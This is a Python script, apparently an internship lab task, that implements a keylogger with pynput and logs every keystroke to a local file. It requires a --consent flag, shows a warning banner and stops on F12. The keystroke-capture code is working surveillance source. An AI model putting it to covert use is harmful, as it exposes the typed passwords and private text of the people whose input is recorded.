"""
Educational keylogger demo — logs keystrokes to a file (authorized/lab use only).

Prodigy InfoTech — PRODIGY_CS_04
Requires explicit --consent. Press F12 to stop the listener.
"""

from __future__ import annotations

import argparse
import sys
import threading
from datetime import datetime, timezone
from pathlib import Path

from pynput import keyboard

_LOG_LOCK = threading.Lock()

_KEY_ALIASES: dict[keyboard.Key, str] = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "\n",
    keyboard.Key.tab: "\t",
    keyboard.Key.backspace: "<BACKSPACE>",
    keyboard.Key.delete: "<DELETE>",
    keyboard.Key.esc: "<ESC>",
}


def _format_keystroke(key: keyboard.Key | keyboard.KeyCode) -> str:
    if isinstance(key, keyboard.KeyCode):
        if key.char is not None:
            return key.char
        if key.vk is not None:
            return f"<code_{key.vk}>"
        return "<?>"
    if key in _KEY_ALIASES:
        return _KEY_ALIASES[key]
    name = getattr(key, "name", None) or "key"
    return f"<{name.upper()}>"


def _banner(log_path: Path, suppress_keys: bool) -> None:
    print()
    print("=" * 60)
    print("  EDUCATIONAL KEYLOGGER (PRODIGY_CS_04)")
    print("  - Logging ONLY to:", log_path.resolve())
    print(
        "  - Terminal key echo:",
        "suppressed (default)" if suppress_keys else "allowed (--no-suppress)",
    )
    print("  - Press F12 to stop")
    print("  - Unauthorized use may be illegal. Stop if you lack permission.")
    print("=" * 60)
    print()


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Educational keystroke logger (consent required). Task-04 / PRODIGY_CS_04."
    )
    parser.add_argument(
        "--consent",
        action="store_true",
        help="Required: you have written or personal authority to capture input on this machine.",
    )
    parser.add_argument(
        "-o",
        "--output",
        type=Path,
        default=Path("keystroke_log.txt"),
        help="Log file path (default: ./keystroke_log.txt)",
    )
    parser.add_argument(
        "--no-suppress",
        action="store_true",
        help="Allow keys to also go to active apps/terminal (not recommended for demos).",
    )
    args = parser.parse_args()

    if not args.consent:
        parser.error(
            "Refusing to start without --consent. Only use on systems you own or are "
            "explicitly authorized to test. See README."
        )

    log_path = args.output
    try:
        log_path.parent.mkdir(parents=True, exist_ok=True)
        log_file = open(log_path, "a", encoding="utf-8")
    except OSError as e:
        print(f"Cannot open log file: {e}", file=sys.stderr)
        sys.exit(1)

    log_file.write(f"\n--- session start {datetime.now(timezone.utc).isoformat()} UTC ---\n")
    log_file.flush()

    suppress_keys = not args.no_suppress
    _banner(log_path, suppress_keys)

    def write_chunk(chunk: str) -> None:
        with _LOG_LOCK:
            try:
                log_file.write(chunk)
                log_file.flush()
            except OSError:
                pass

    def on_press(key: keyboard.Key | keyboard.KeyCode) -> None:
        try:
            write_chunk(_format_keystroke(key))
        except AttributeError:
            write_chunk("<?>")

    def on_release(key: keyboard.Key | keyboard.KeyCode) -> bool | None:
        if key == keyboard.Key.f12:
            print("\n[F12] Stopping listener. Session ended.")
            write_chunk(
                f"\n--- session end {datetime.now(timezone.utc).isoformat()} UTC ---\n"
            )
            return False
        return None

    try:
        with keyboard.Listener(
            on_press=on_press, on_release=on_release, suppress=suppress_keys
        ) as listener:
            listener.join()
    except OSError as e:
        print(f"Listener error (permissions/OS): {e}", file=sys.stderr)
        sys.exit(1)
    finally:
        try:
            log_file.close()
        except OSError:
            pass


if __name__ == "__main__":
    main()
